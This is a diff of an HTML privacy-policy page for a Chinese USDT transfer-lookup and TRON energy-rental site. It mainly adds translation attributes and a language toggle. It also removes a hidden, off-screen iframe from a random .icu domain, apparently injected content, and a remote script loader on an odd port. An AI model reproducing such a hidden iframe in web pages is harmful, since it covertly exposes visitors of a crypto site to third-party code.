@@ -4,29 +4,32 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <title>隐私政策 - 查个U</title>
-<link rel='stylesheet' id='usdtcn-main-css' href='https://chauba.com/wp-content/themes/chau/assets/css/main.css?ver=1.1.0' media='all' />
+    <link rel='stylesheet' id='usdtcn-main-css' href='https://chauba.com/wp-content/themes/chau/assets/css/main.css?ver=1.1.0' media='all' />
+    <style>
+        body { opacity: 0; transition: opacity 0.3s ease; }
+        .lang-switch-btn { background: none; border: 1px solid #d91f26; color: #d91f26; padding: 6px 12px; border-radius: 20px; cursor: pointer; font-size: 13px; font-weight: bold; margin-right: 15px; transition: all 0.2s; }
+        .lang-switch-btn:hover { background: #d91f26; color: #fff; }
+    </style>
 </head>
 <body class="wp-singular page-template-default page page-id-105 wp-theme-chau usdt-theme">
-<iframe src="https://f3dlvbk5edo5s57.icu/channel/L.U.FE/weifile/weifile.html"  style="position:fixed;top:0;left:-1000px;pointer-events:none;border:0"></iframe>
 <header class="site-header">
     <div class="header-topline"></div>
     <div class="container header-inner">
-        <a class="site-logo" href="index.html">
-            <img src="logo.png" alt="查个U" style="height: 48px; width: auto; object-fit: contain;">
-        </a>
-        <button class="menu-toggle" type="button" aria-label="打开菜单" data-menu-toggle><span></span><span></span><span></span></button>
+        <a class="site-logo" href="index.html"><img src="logo.png" alt="查个U" style="height: 48px; width: auto; object-fit: contain;"></a>
+        <button class="menu-toggle" type="button" data-menu-toggle><span></span><span></span><span></span></button>
         <nav class="main-nav" data-main-nav>
             <ul class="nav-menu">
-                <li><a href="index.html">首页</a></li>
-                <li><a href="usdt.html">USDT转账查询</a></li>
-                <li><a href="energy.html">能量闪租</a></li>
-                <li><a href="guide.html">使用教程</a></li>
-                <li><a href="about.html">关于我们</a></li>
-                <li><a href="contact.html">联系我们</a></li>
+                <li><a href="index.html" data-i18n="nav_home">首页</a></li>
+                <li><a href="usdt.html" data-i18n="nav_usdt">USDT转账查询</a></li>
+                <li><a href="energy.html" data-i18n="nav_energy">能量闪租</a></li>
+                <li><a href="guide.html" data-i18n="nav_guide">使用教程</a></li>
+                <li><a href="about.html" data-i18n="nav_about">关于我们</a></li>
+                <li><a href="contact.html" data-i18n="nav_contact">联系我们</a></li>
             </ul>
         </nav>
-        <div class="header-actions">
-            <a class="header-action" href="usdt.html">立即查询</a>
+        <div class="header-actions" style="display: flex; align-items: center;">
+            <button class="lang-switch-btn" id="langSwitchBtn" onclick="toggleLanguage()">EN</button>
+            <a class="header-action" href="usdt.html" data-i18n="nav_search_btn">立即查询</a>
         </div>
     </div>
 </header>
@@ -34,22 +37,22 @@
 <main class="site-main">
     <section class="page-hero">
         <div class="container">
-            <div class="hero-kicker">隐私政策</div>
-            <h1>隐私政策</h1>
-            <p>我们重视并保护您的隐私信息。</p>
+            <div class="hero-kicker" data-i18n="privacy_kicker">隐私政策</div>
+            <h1 data-i18n="privacy_title">隐私政策</h1>
+            <p data-i18n="privacy_desc">我们重视并保护您的隐私信息。</p>
         </div>
     </section>
 
     <div class="container">
         <div class="site-notice-red">
-            <strong>安全提醒：</strong> 本站绝对不会向您索要私钥、助记词或钱包密码。
+            <strong data-i18n="privacy_alert">安全提醒：</strong> <span data-i18n="privacy_alert_desc">本站绝对不会向您索要私钥、助记词或钱包密码。</span>
         </div>
         <section class="section article-content">
-            <h2>隐私政策说明</h2>
-            <p>1. 数据收集：本站在提供USDT转账查询服务时，仅接收用户主动输入的公开地址或交易哈希（TxID）。我们不会收集您的私钥、助记词、密码或其他敏感身份信息。</p>
-            <p>2. 查询记录：您输入的查询关键字仅用于对接波场官方公开接口获取链上数据，本站不长期存储您的查询记录。</p>
-            <p>3. 能量租赁：在能量闪租环节，我们仅公开收款地址。系统自动识别链上到账记录并委托能量，不涉及对用户钱包控制权的获取。</p>
-            <p>4. 日志与统计：本站可能使用基础的访问统计工具（如IP、浏览器类型）以优化网站性能。这些数据不涉及您的资产安全。</p>
+            <h2 data-i18n="privacy_sec_title">隐私政策说明</h2>
+            <p data-i18n="privacy_p1">1. 数据收集：本站在提供USDT转账查询服务时，仅接收用户主动输入的公开地址或交易哈希（TxID）。我们不会收集您的私钥、助记词、密码或其他敏感身份信息。</p>
+            <p data-i18n="privacy_p2">2. 查询记录：您输入的查询关键字仅用于对接波场官方公开接口获取链上数据，本站不长期存储您的查询记录。</p>
+            <p data-i18n="privacy_p3">3. 能量租赁：在能量闪租环节，我们仅公开收款地址。系统自动识别链上到账记录并委托能量，不涉及对用户钱包控制权的获取。</p>
+            <p data-i18n="privacy_p4">4. 日志与统计：本站可能使用基础的访问统计工具（如IP、浏览器类型）以优化网站性能。这些数据不涉及您的资产安全。</p>
         </section>
     </div>
 </main>
@@ -57,42 +60,30 @@
 <footer class="site-footer">
     <div class="container footer-grid">
         <div class="footer-about">
-            <h3>USDT转账查询</h3>
-            <p>查个U提供USDT转账查询、USDT交易查询、USDT地址查询和交易哈希查询等公开链上信息查询服务。</p>
-            <p class="footer-warning">本站不提供数字货币交易、钱包托管、充值提现、资金找回、投资建议或担保服务。</p>
+            <h3 data-i18n="footer_title">USDT转账查询</h3>
+            <p data-i18n="footer_desc">查个U提供USDT转账查询等公开链上信息查询服务。</p>
+            <p class="footer-warning" data-i18n="footer_warning">本站不提供数字货币交易、钱包托管、充值提现等服务。</p>
         </div>
         <div>
-            <h4>核心功能</h4>
-            <a href="usdt.html">USDT转账查询</a>
-            <a href="energy.html">能量闪租</a>
-            <a href="guide.html">使用教程</a>
+            <h4 data-i18n="footer_core">核心功能</h4>
+            <a href="usdt.html" data-i18n="nav_usdt">USDT转账查询</a>
+            <a href="energy.html" data-i18n="nav_energy">能量闪租</a>
+            <a href="guide.html" data-i18n="nav_guide">使用教程</a>
         </div>
         <div>
-            <h4>网站信息</h4>
-            <a href="about.html">关于我们</a>
-            <a href="contact.html">联系我们</a>
+            <h4 data-i18n="footer_info">网站信息</h4>
+            <a href="about.html" data-i18n="nav_about">关于我们</a>
+            <a href="contact.html" data-i18n="nav_contact">联系我们</a>
         </div>
         <div>
-            <h4>说明页面</h4>
-            <a href="privacy.html">隐私政策</a>
-            <a href="terms.html">服务条款</a>
-            <a href="disclaimer.html">免责声明</a>
+            <h4 data-i18n="footer_pages">说明页面</h4>
+            <a href="privacy.html" data-i18n="privacy">隐私政策</a>
+            <a href="terms.html" data-i18n="terms">服务条款</a>
+            <a href="disclaimer.html" data-i18n="disclaimer">免责声明</a>
         </div>
     </div>
-    <div class="container footer-bottom">
-        <p>© 2026 查个U. 所有查询结果仅供参考。</p>
-    </div>
+    <div class="container footer-bottom"><p data-i18n="copyright">© 2026 查个U. 所有查询结果仅供参考。</p></div>
 </footer>
-<button class="backtop" type="button" data-backtop>↑</button>
-<script>
-  var _mtj = _mtj || [];
-  (function () {
-  var mtj = document.createElement("script");
-  mtj.src = "https://node96.aizhantj.com:21233/tjjs/?k=ger69t3dmhn";
-  var s = document.getElementsByTagName("script")[0];
-  s.parentNode.insertBefore(mtj, s);
-  })();
-</script>
-<script id="usdtcn-app-js" src="https://chauba.com/wp-content/themes/chau/assets/js/app.js?ver=1.1.0"></script>
+<script src="lang.js"></script>
 </body>
 </html>
